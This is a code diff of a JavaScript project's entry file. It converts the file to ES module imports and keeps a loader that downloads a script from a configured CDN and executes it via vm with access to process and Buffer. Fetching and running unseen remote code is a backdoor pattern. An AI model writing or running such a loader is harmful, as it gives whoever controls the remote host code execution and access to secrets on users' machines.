@@ -17,19 +17,32 @@ $$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
 * Release Date : 15 December 2024 12.01 AM
 */
 
-
 // ZIMBABWEAN STAR ON TOP
-const axios = require('axios');
-const vm = require('vm');
-// const config = require('./settings.js');
-const config = require('./settings.js').default;
 
+import axios from 'axios';
+import vm from 'vm';
+import config from './settings.js';
 
 (async () => {
   try {
     console.log("❄️ Subzero Synchronization Initiated !");
-    const { data: scriptCode } = await axios.get(`${config.CDN}/mrfrank/index.js`);
-    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
+
+    const { data: scriptCode } = await axios.get(
+      `${config.CDN}/mrfrank/index.js`
+    );
+
+    const context = vm.createContext({
+      console,
+      process,
+      Buffer,
+      setTimeout,
+      setInterval,
+      clearTimeout,
+      clearInterval
+    });
+
+    new vm.Script(scriptCode).runInContext(context);
+
   } catch (err) {
     console.error("Error:", err);
   }
